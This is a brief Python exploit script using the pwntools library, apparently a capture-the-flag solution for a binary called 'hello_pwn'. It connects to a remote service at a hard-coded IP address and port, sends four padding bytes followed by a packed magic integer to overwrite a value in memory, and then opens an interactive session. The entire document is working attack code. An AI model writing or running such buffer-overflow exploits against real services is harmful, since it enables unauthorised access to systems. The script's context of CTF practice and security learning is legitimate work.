from pwn import *
h,p = '111.200.241.244',60795
p = remote(h,p)
#p = process("./hello_pwn")
winval = 1853186401
#gdb.attach("hello_pwn")
exp = "AAAA"+p32(winval)
p.sendline(exp)
p.interactive()
